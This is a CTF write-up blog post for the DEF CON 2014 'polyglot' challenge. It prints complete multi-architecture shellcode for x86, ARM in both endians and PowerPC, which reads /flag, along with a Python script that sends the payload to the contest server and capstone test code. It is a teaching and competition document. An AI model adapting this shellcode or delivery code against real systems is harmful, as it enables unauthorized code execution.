---
title: '[defcon 2014 quals] polyglot'
author: deroko
layout: post

shorturls:
  - 'a:0:{}'
aktt_notify_twitter:
  - no
tweetbackscheck:
  - 1408358898
kopa_newsmixlight_total_view:
  - 1
category: ctf - clgt crew
---
Challenge was getting 0&#215;1000 bytes from socket, and executing it following these rules (all shellcodes and codes are at the end of this writeup):

<pre class="brush: plain; title: ; notranslate" title="">- all general purpose registers are 0
- stack is at 0x42000000
- pc    is at 0x41000000

</pre>

All binaries:  
**x86** : [polyglot_9d64fa98df6ee55e1a5baf0a170d3367][1]  
**armel** : [polyglot_6a3875ce36a55889427542903cd43893][2]  
**armeb** : [polyglot_c0e7a26d7ce539efbecc970c154de844][3]  
**PowerPC**: [polyglot_5b78585342a3c116aebb5a9b45e88836][4]

**Our shellcode should read /flag and output it to stdout**. Very simple? I thought that there is some filtering for shellcode, but that didn&#8217;t happen. Only problem I&#8217;ve encountered was with size of send buffer. Don&#8217;t know why, but seemed that my system wasn&#8217;t sending all 0&#215;1000 bytes in one run, which gave me some headache latter on. First shellcode to execute is x86. You may see this by connecting to the server, and it will grant you with this message (after we send password to the server given to us by organizer: **w0rk\_tHaT\_tAlEnTeD_t0nGu3**).

<pre class="brush: plain; title: ; notranslate" title="">----------------------------
Give me shellcode.  You have up to 0x1000 bytes.  All GPRs are 0.  PC is 0x41000000.  SP is 0x42000000.

Throwing shellcode against linux26-x86.(http://services.2014.shallweplayaga.me/polyglot_9d64fa98df6ee55e1a5baf0a170d3367)
----------------------------

</pre>

This was quite simple.

Next one on the line was **armel**, so our shellcode has to be compatible with **x86** and **armel**. Simple, we just find B instruction and branch over x86 shellcode. For writing this shellcode I used **raspbian** in **qemu**. Once this shellcode was executed, next one was **armeb**, eg. same shell code but differently stored in a big endian. Now comes funny part, finding 2 instructions which are do nothing for armel and B for armeb and vice verse. For this purpose I&#8217;ve experimented with branch instructions and after a bit found good combination:

<pre class="brush: plain; title: ; notranslate" title="">dd      0xEB0000E0
       dd      0xE00000EB

</pre>

Which, tnx to capstone comes to be:

<pre class="brush: plain; title: ; notranslate" title="">0x00000000: bl #0x380
0x00000004: and r0, r0, fp, ror #1

</pre>

Very good, at this offset I had:

<pre class="brush: plain; title: ; notranslate" title="">ldr    pc, [pc, #4]        &lt;--- for  armel
      ldr    pc, [pc, #4]        &lt;--- form armeb
      dd    address_of_armel_shellcode
      dd    address_of_armeb_shellcode

</pre>

Here I figured that my shellcode doesn&#8217;t get transfered as a whole, as my original first ARM instructions were going to 0x41000Fxx where I had LDR PC, [PC, #4]. Also while playing with ARM instructions in IDA, I&#8217;ve noticed that IDA showed some ARM **BEQ** instructions as **B** which was wrong. From this point on I’ve used only **capstone** as this beq/b wrong translation in IDA gave me also some headache.

Now comes 4th stage, and that was the ugliest one: **PowerPC** . I try to avoid any possible shellcode in the wild, and prefer to write my own always. For this, due to whatever reason qemu which comes with ubuntu 14.04 couldn&#8217;t run PowerPC image which I&#8217;ve located here:  
<http://people.debian.org/~aurel32/qemu/powerpc/> (you can also get armel and amrhf from this link)

No problem, downloaded qemu 2.0.0 and recompiled and it worked. Time to start writing my code. Of course, gdb is very very useless without any hookstop, so for this purpose I wrote simple  .gdbinit to help me develop this shellcode:

<pre class="brush: plain; title: ; notranslate" title="">define hook-stop
        printf "---------------------------------------------------------------n"
        printf "r0 : 0x%.08X r1 : 0x%.08X r2 : 0x%.08X r3 : 0x%.08Xn", $r0, $r1, $r2, $r3
        printf "r4 : 0x%.08X r5 : 0x%.08X r6 : 0x%.08X r7 : 0x%.08Xn", $r4, $r5, $r6, $r7
        printf "---------------------------------------------------------------n"
        x/10i   $pc
end

</pre>

We are ready to go with simple test. One thing about PowerPC syntax is that registers in assembly are represented as 0-31, so it&#8217;s sometimes hard to make difference and notice errors, which puzzled  me a lot. Here is PowerPC code  
**pc**           is set at 0&#215;41000000  
**r1** is sp and is set at 0&#215;42000000

**syscall number is passed in r0**, and **arguments follow in r3,r4 etc.** **return values are stored in r3**:

<pre class="brush: plain; title: ; notranslate" title="">addi    1, 1, 0x400             //increment stack a bit (just in case)
        xor     30, 30, 30              //wipe r30 just in case, as junk opcode modifies it
        b       __flag_address          //jmp/call simulation in PowerPC
__goback:
        xor     4,4,4
        mfspr   3, 8                    //get /flag into r3
        li      0, 5                    //load r0 with 5
        sc                              //system call (funny name of sc instruction)

        //read
        xor     4, 4, 4                 //xor r4, r4, r4
        addi    4, 1, 0x0               //mov r1 to r4 &lt;--- add is used to simulate mov
        xor     5, 5, 5                 //do same for r5 as we did for r4
        addi    5, 5, 0x64              //set r5 to 0x64, maybe better would be li... but who cares...
        //r3 has fd
        li      0, 3                    //r0 = read syscall (r3 is already set to fd)
        sc

        //write
        xor     5, 5, 5                 //r5 to 0
        addi    5 ,5, 0x64              //r5 to 0x64
        xor     4, 4, 4
        addi    4, 1, 0
        xor     3, 3, 3                 //r3 = 0
        addi    3, 3, 1                 //r3 = 1 (stdout)
        li      0, 4                    //r0 = 4 (write)
        sc                              //sc

        xor     3, 3, 3
        //exit
        li      0, 1
        sc

__flag_address:
        bl      __goback
flag:   .ascii "/flag"
</pre>

My biggest error came in **addi 4,1,0** as I didn&#8217;t use **addi** but I&#8217;ve used **add**, in this great syntax it assembles to: **add r4, r1, r0** &#8212; r0 + SP and I just wanted to do **addi r4, r1, 0** (easy way to move data from one register to another&#8230;). This took some time to figure, and was really really annoying part, as shellcode worked on their binary running on my PowerPC so it was hard to spot error. One way for me to test PowerPC (before I&#8217;ve noticed addi add error in shellcode) was to use **/flags** instead of **/flag** which would on open block server. I have no idea what /flags was on remote sysem, but server would hang and would not send any error back (no socket close, no reply, nothing, just idle state).

Now comes part where I need to put B to PowerPC and to skip over ARM code, and make it x86 compatible. This tooks some time, as I needed such instruction (and I found one) which is perfectly skipped by arm, but x86 wouldn&#8217;t like it (no matter what) as B in PowerPC starts with 0x4x which translates to inc/dec registers on x86. Next byte after 0x4x must be 0&#215;0 so we don&#8217;t jump far (well it makes conditional jmp on PowerPC but I didn&#8217;t want to waste too much time on learning full PowerPC assembly)

One good solution which worked (but tnx to add r4, r1, r0) I thought that this time I had same problem like in arm, that my computer didn&#8217;t send enough data:

<pre class="brush: plain; title: ; notranslate" title="">code = "";
code += "x40x00x04x05";
code += "x02x00x00x42";

</pre>

which translates to brilliant opcodes which are properly executed:

<pre class="brush: plain; title: ; notranslate" title="">ARM:
0x00000000: streq r0, [r4, #-0x40]      &lt;--- armel (doesn't store anything so it's good to go)
0x00000004: andmi r0, r0, #2            &lt;--- armel (who cares...)
0x00000008: andmi r0, r0, r5, lsl #8    &lt;--- armeb
0x0000000c: andeq r0, r0, #0x42         &lt;--- armeb
PPC:
0x00000000: bcl 0, 0, .+0x404           &lt;--- excelent b to 0x404 for PowerPC
x86:
0x00000000: inc eax
0x00000001: add byte ptr [eax + 0x42000002], al &lt;--- brilliant write to who cares at stack

</pre>

But I abandoned this as I thought that 0&#215;404 was wrong (eg. not all data was transferred ) So tnx to x86 instructions set where we can have arbitrary instruction size, I&#8217;ve decided to use next approach.

Next step was, lets make dummy instruction which will do **jmp _\_overPPC\_arm** and be almost like NOP for all other platforms. One pair of 2 byte instructions came to my mind. **xor eax, eax/jz __x86 shellcode**, and many other options here (eg. stc/jb, clc/jnb, inc eax/jns, dec eax/js, test eax,eax/jz, test esp, esp/jnz, cmp/or/sub, endless options.):

<pre class="brush: plain; title: ; notranslate" title="">code = "";
code += "x33xc0x74x10";            #didn't put it after for armeb as bswaped
                                                            #ppc doesn't give right results. but it's
                                                            #do nothing for armeb
code += "x48x00x01x00";            #to test for armel
code += "x00x01x00x48";            #to test for armeb

and capstone gives us back:


ARM:
0x00000000: rsbsne ip, r4, r3, lsr r0           #x86 code
0x00000004: andeq r0, r1, r8, asr #32        #B for PPC as armel
0x00000008: stmdami r0, {r8}                     #B for PPC as armeb
PPC:
0x00000000: addic r30, r0, 0x7410            #x86 code
0x00000004: b .+0x100                             #our bracnh looks good...

</pre>

Now we place PowerPPC code at 0&#215;104 offset and there we go. Running my assembly code against server gives back:

<pre class="brush: plain; title: ; notranslate" title="">---------------------------------------------------------------------------------------------------------
xxx# python sendshellcode.py
Password:


Give me shellcode.  You have up to 0x1000 bytes.  All GPRs are 0.  PC is 0x41000000.  SP is 0x42000000.

Throwing shellcode against linux26-x86.(http://services.2014.shallweplayaga.me/polyglot_9d64fa98df6ee55e1a5baf0a170d3367)

Throwing shellcode against linux26-armel.(http://services.2014.shallweplayaga.me/polyglot_6a3875ce36a55889427542903cd43893)

Throwing shellcode against linux26-armeb.(http://services.2014.shallweplayaga.me/polyglot_c0e7a26d7ce539efbecc970c154de844)

Throwing shellcode against linux26-ppc.(http://services.2014.shallweplayaga.me/polyglot_5b78585342a3c116aebb5a9b45e88836)

The flag is: I can tie a knot in a cherry stem

xxx#
---------------------------------------------------------------------------------------------------------

</pre>

And we got the flag : ** I can tie a knot in a cherry stem**

**ARM shellcode:**

<pre class="brush: plain; title: ; notranslate" title="">shellcode:
        add     sp, #100
        add     sp, #100
        add     sp, #100
        add     sp, #100

        adr     r0, flag
        mov     r1, 0
        svc     0x900005
        mov     r2, #100
        mov     r1, sp
        sub     r1, #100
        svc     0x900003

        mov     r2, #100
        mov     r1, sp
        sub     r1, #100
        mov     r0, 1
        svc     0x900004

        mov     r0, 0
        svc     0x900001
flag:

</pre>

Final shellcode which shold be compield with nasm as : **nasm -fbin sc.asm -o sc.bin **

<pre class="brush: plain; title: ; notranslate" title="">[BITS 32]


                        db	0x33, 0xc0, 0x74, 0x10
                        db	0x48, 0x00, 0x01, 0x00


                        dd      0xEB0000E0
                        dd      0xE00000EB

__x86_shellcode:        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        nop
                        add    esp, 0xFFC
                        call   __delta
__delta:                pop    ebp
                        sub    ebp, __delta
                        xor    ecx, ecx
                        lea    ebx, [ebp+flag]
                        mov    eax, 0x05
                        int    0x80
                        mov    esi, eax

                        mov    edi, esp
                        sub    edi, 0x200
                        xor    eax, eax
                        cld
                        mov    ecx, 0x200
                        rep    stosb
                        mov    edi, esp
                        sub    edi, 0x200

                        mov    edx, 80
                        mov    ecx, edi
                        mov    ebx, esi
                        mov    eax, 3
                        int    0x80

                        mov    edx, 80
                        mov    ecx, edi
                        xor    ebx, ebx
                        mov    eax, ebx
                        inc    ebx
                        mov    eax, 4
                        int    0x80
                        xor    ebx, ebx
                        mov    eax, 1
                        int    0x80


flag:                   db      "/flag", 0
buffer:
                        times 0x104 - ($-$$) db 0xFF
                        dd       0x00042138
                        dd       0x78F2DE7F
                        dd       0x58000048
                        dd       0x7822847C
                        dd       0xA602687C
                        dd       0x05000038
                        dd       0x02000044
                        dd       0x7822847C
                        dd       0x00008138
                        dd       0x782AA57C
                        dd       0x6400A538
                        dd       0x03000038
                        dd       0x02000044
                        dd       0x782AA57C
                        dd       0x6400A538
                        dd       0x7822847C
                        dd       0x00008138
                        dd       0x781A637C
                        dd       0x01006338
                        dd       0x04000038
                        dd       0x02000044
                        dd       0x781A637C
                        dd       0x01000038
                        dd       0x02000044
                        dd       0xADFFFF4B
                        db       "/flag", 0
                        times 0x200 - ($-$$) db 0xFF
                        align	4
                        ;arm shellcode -&gt; open in IDA and CPU set to ARM -&gt; goto 0x200 (little endian)
                        dd
                        dd       0xE28DD064
                        dd       0xE28DD064
                        dd       0xE28DD064
                        dd       0xE28DD064
                        dd       0xE28F0030
                        dd       0xE3A01000
                        dd       0xEF900005
                        dd       0xE3A02064
                        dd       0xE1A0100D
                        dd       0xE2411064
                        dd       0xEF900003
                        dd       0xE3A02064
                        dd       0xE1A0100D
                        dd       0xE2411064
                        dd       0xE3A00001
                        dd       0xEF900004
                        dd       0xE3A00000
                        dd       0xEF900001
                        db       "/flag", 0


                        times 0x300 - ($-$$) db 0xFF
                        align    4
                        ;big endian arm shellcode -&gt; same procedure like for previos ARM but select big endian arm
                        ;shellcodes are exactly them same with change that this one is convereted to big-endian
                        dd       0x64D08DE2
                        dd       0x64D08DE2
                        dd       0x64D08DE2
                        dd       0x64D08DE2
                        dd       0x30008FE2
                        dd       0x0010A0E3
                        dd       0x050090EF
                        dd       0x6420A0E3
                        dd       0x0D10A0E1
                        dd       0x641041E2
                        dd       0x030090EF
                        dd       0x6420A0E3
                        dd       0x0D10A0E1
                        dd       0x641041E2
                        dd       0x0100A0E3
                        dd       0x040090EF
                        dd       0x0000A0E3
                        dd       0x010090EF
                        db       "/flag", 0

                        ;LDR    pc, [pc, #4]		little endian
                        ;LDR    pc, [pc, #4]	 	big endian
                        times    0x390 - ($-$$) db 0xFF
                        dd       0xE59FF000
                        dd       0x00F09FE5
                        dd       0x41000200
                        dd       0x00030041


</pre>

**Generic python code for CTF when user input is required:**

<pre class="brush: plain; title: ; notranslate" title="">SELECT_TIMEOUT = 2;

def	callmefunc(sock, buff):
	print(buff);
	if "Password" in buff:
		sock.send("w0rk_tHaT_tAlEnTeD_t0nGu3n");
	if "Give me shellcode" in buff:
		f = open("sc.bin", "rb");
		buff = f.read();
		sock.send(buff);
	return 0;

def	recv_all(sock, callme):
	buff = "";
	while True:
		rlist = select.select([sock,], [], [], SELECT_TIMEOUT)[0];
		if len(rlist) == 0: continue;
		try:
			buff = sock.recv(0x1000);
		except:
			break;
		if not buff: break;
		ret = callme(sock, buff);
		if ret != 0:
			sock.close();
			return;

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
sock.connect(("polyglot_9d64fa98df6ee55e1a5baf0a170d3367.2014.shallweplayaga.me", 30000));

recv_all(sock, callmefunc);

exit();


</pre>

**capstone python code for testing**

<pre class="brush: plain; title: ; notranslate" title="">import capstone


#code =  "xE0x00x00xEB";
#code += "xEBx00x00xe0";
code = "";
code += "x33xc0x74x10";
code += "x48x00x01x00";
code += "x00x01x00x48";

print("ARM:")
md = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM);
data = md.disasm(code, 0x0);
for insn in data:
	print("0x%.08x: %s %s" % (insn.address, insn.mnemonic, insn.op_str));


print("PPC:");
md = capstone.Cs(capstone.CS_ARCH_PPC, capstone.CS_MODE_BIG_ENDIAN);
data = md.disasm(code, 0x0);
for insn in data:
	print("0x%.08x: %s %s" % (insn.address, insn.mnemonic, insn.op_str));


print("x86:");
md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32);
data = md.disasm(code, 0x0);
for insn in data:
        print("0x%.08x: %s %s" % (insn.address, insn.mnemonic, insn.op_str));
</pre>

 [1]: http://deroko.phearless.org/polyglot/polyglot_9d64fa98df6ee55e1a5baf0a170d3367
 [2]: http://deroko.phearless.org/polyglot/polyglot_6a3875ce36a55889427542903cd43893
 [3]: http://deroko.phearless.org/polyglot/polyglot_c0e7a26d7ce539efbecc970c154de844
 [4]: http://deroko.phearless.org/polyglot/polyglot_5b78585342a3c116aebb5a9b45e88836